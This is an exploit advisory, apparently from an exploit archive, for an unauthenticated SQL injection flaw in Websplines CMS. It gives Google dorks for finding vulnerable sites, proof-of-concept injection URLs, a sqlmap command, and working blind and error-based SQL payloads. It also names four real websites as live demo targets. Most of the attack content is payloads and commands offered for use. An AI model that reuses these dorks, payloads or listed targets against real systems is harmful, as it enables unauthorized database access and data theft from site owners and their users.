[+] Title                 :- Websplines CMS - SQL Injection Vulnerability 
[+] Date                  :- 11 - July - 2015
[+] Vendor Homepage       :- http://www.websplines.com/
[+] Version               :- All Versions
[+] Tested on             :- Nginx/1.4.5, PHP/5.2.17, Linux - Windows
[+] Category              :- webapps
[+] Google Dorks          :- "Developed by Websplines:"
                             "Developed by Websplines:" +inurl:/.php?id=                                                 
[+] Exploit Author        :- Shelesh Rauthan (ShOrTy420 aKa SEB@sTiaN)
[+] Team name             :- Team Alastor Breeze, Intelligent-Exploit
[+] Official Website      :- serverfarming.com, intelligentexploit.com
[+] The official Members  :- Sh0rTy420, P@rL0u$, !nfIn!Ty, Th3G0v3Rn3R, m777k
[+] Greedz to             :- @@lu, Lalit, MyLappy<3, Diksha, DK
[+] Contact               :- fb.com/shelesh.rauthan, indian.1337.hacker@gmail.com, shortycharsobeas@gmail.com

=========================================================
[+] Severity Level          :- High

[+] Request Method(s)       :- GET / POST

[+] Vulnerable Parameter(s) :- id, Sid, pid

[+] Affected Area(s)        :- Entire admin, database, Server

[+] About                   :- Unauthenticated SQL Injection via Multiple Php Files causing an SQL error

[+] SQL vulnerable File     :- /home/DOMAIN/public_html/XXX.php

[+] POC                     :- http://127.0.0.1/XXX.php?id=[SQL]'

The sql Injection web vulnerability can be be exploited by remote attackers without any privilege of web-application user account or user interaction.
 
 SELECT * FROM myscs_db.myscs_sub_links where status = 'active' AND id = '16''  <---- injection query

PoC:-
http://www.[WEBSITE].com/XXX.php?id=16' order by [SQL IN4JECTION]--+
http://www.[WEBSITE].com/XXX.php?id=16'' union all select [SQL INJECTION]--+


SQLMap
++++++++++++++++++++++++++
python sqlmap.py --url "http://127.0.0.1/XXX.php?id=[SQL]" --dbs
++++++++++++++++++++++++++
---
Parameter: Sid (GET)
    Type: boolean-based blind
    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
    Payload: Sid=(SELECT (CASE WHEN (2668=2668) THEN 2668 ELSE 2668*(SELECT 2668 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: Sid=43 AND (SELECT 3129 FROM(SELECT COUNT(*),CONCAT(0x717a767871,(SELECT (ELT(3129=3129,1))),0x716a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---


[+] DEMO :-   http://www.icd.org.pk/course.php?id=16'
              https://www.industrialmotoring.com/services.php?Sid=43'
              http://www.condosworld.com/mls-commercial-overview.php?id=897'
              http://myscs.org/study-abroad-detail.php?id=63'

